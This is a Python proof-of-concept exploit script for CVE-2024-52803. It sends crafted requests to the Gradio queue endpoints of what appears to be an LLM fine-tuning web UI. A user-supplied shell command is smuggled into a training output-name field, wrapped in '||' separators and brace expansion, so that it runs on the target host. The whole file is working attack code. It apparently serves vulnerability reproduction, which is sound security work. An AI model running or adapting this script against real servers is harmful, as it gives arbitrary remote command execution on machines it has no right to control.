#!/usr/bin/env python3
# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""
Simple PoC for CVE-2024-52803 using the upstream gist payload.

Based on PoC by superboy-zjc:
https://gist.github.com/superboy-zjc/f2d2b93ae511c445ba97e144b70e534d
"""

import argparse
import json
import random
import string
import sys

import requests


def generate_session_hash(length=12):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def run_poc(base_url, command, trace=False):
    session_hash = generate_session_hash()
    formatted_value = "{" + ",".join(command.split()) + "}"

    join_payload = {
        "data": [
            "en",
            "microsoft/DialoGPT-medium",
            "microsoft/DialoGPT-medium",
            "lora",
            [],
            "none",
            "bitsandbytes",
            "cohere",
            "none",
            "auto",
            "Supervised Fine-Tuning",
            "data",
            ["identity"],
            "5e-5",
            "3.0",
            "1.0",
            "100000",
            "bf16",
            2048,
            2,
            8,
            0,
            "cosine",
            5,
            100,
            0,
            0,
            '{"optim": "adamw_torch"}',
            False,
            False,
            False,
            False,
            False,
            False,
            False,
            False,
            2,
            "all",
            "",
            8,
            16,
            0,
            0,
            False,
            False,
            False,
            False,
            "",
            "",
            0.1,
            0,
            "sigmoid",
            None,
            False,
            False,
            False,
            16,
            200,
            0.25,
            "all",
            False,
            "layer",
            "ascending",
            50,
            0.05,
            f"train_2024-11-21-10-44-30|| {formatted_value} ||",
            "2024-11-20-21-24-26.yaml",
            "none",
            False,
        ],
        "event_data": None,
        "fn_index": 17,
        "trigger_id": 126,
        "session_hash": session_hash,
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": (
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
        ),
        "Origin": base_url,
        "Referer": f"{base_url}/",
        "Accept": "*/*",
        "Connection": "keep-alive",
    }

    print(f"[*] Target: {base_url}")
    print(f"[*] Session hash: {session_hash}")
    print(f"[*] Payload command: {command}")
    print(f"[*] Formatted payload: {formatted_value}")

    print("[*] Sending POST /queue/join...")
    response_join = requests.post(
        f"{base_url}/queue/join",
        headers=headers,
        data=json.dumps(join_payload),
        timeout=10,
    )
    if trace:
        print(f"[TRACE] Status: {response_join.status_code}")
        print(f"[TRACE] Body: {response_join.text}")

    if response_join.status_code != 200:
        print(f"[-] POST /queue/join failed: {response_join.status_code}")
        return False

    print("[+] POST /queue/join accepted.")

    data_headers = {
        "Accept": "text/event-stream",
        "User-Agent": headers["User-Agent"],
        "Referer": headers["Referer"],
        "Connection": "keep-alive",
        "Content-Type": "application/json",
    }

    print("[*] Sending GET /queue/data...")
    response_data = requests.get(
        f"{base_url}/queue/data?session_hash={session_hash}",
        headers=data_headers,
        timeout=30,
    )

    if trace:
        print(f"[TRACE] Status: {response_data.status_code}")
        print(f"[TRACE] Body: {response_data.text}")

    if response_data.status_code != 200:
        print(f"[-] GET /queue/data failed: {response_data.status_code}")
        return False

    print("[+] GET /queue/data returned.")
    print("[+] Check logs/host for command execution.")
    return True


def main():
    parser = argparse.ArgumentParser(description="Simple PoC for CVE-2024-52803")
    parser.add_argument(
        "--url", required=True, help="Base URL (e.g. http://localhost:7860)"
    )
    parser.add_argument(
        "--cmd",
        required=True,
        help="Command to inject (e.g. 'echo poc-marker')",
    )
    parser.add_argument("--trace", action="store_true", help="Print response bodies")
    args = parser.parse_args()

    ok = run_poc(args.url.rstrip("/"), args.cmd, args.trace)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
